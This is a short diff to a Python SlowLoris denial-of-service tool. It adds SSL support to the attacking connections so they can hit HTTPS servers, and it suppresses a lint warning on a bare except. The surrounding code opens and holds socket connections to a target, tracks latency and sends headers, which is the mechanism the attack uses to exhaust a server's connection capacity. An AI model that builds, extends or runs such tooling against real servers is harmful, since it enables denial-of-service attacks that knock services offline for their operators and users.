@@ -3,6 +3,7 @@
 import random
 import socket
 from datetime import datetime
+import ssl
 
 class LorisConnection:
     """SlowLoris connection."""
@@ -12,10 +13,11 @@ class LorisConnection:
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.settimeout(5)
         try:
-            # TODO: Add SSL support
             start_time = datetime.now()
             self.socket.connect((target.host, target.port))
             self.socket.settimeout(None)
+            if target.ssl:
+                self.socket = ssl.wrap_socket(self.socket)
             if not first_connection:
                 latency = (datetime.now() - start_time).total_seconds() * 1000.0
                 if len(target.latest_latency_list) < 10:
@@ -47,7 +49,7 @@ class LorisConnection:
         try:
             self.socket.shutdown(1)
             self.socket.close()
-        except:
+        except: # pylint: disable=bare-except
             pass
 
     def send_headers(self, uagent):
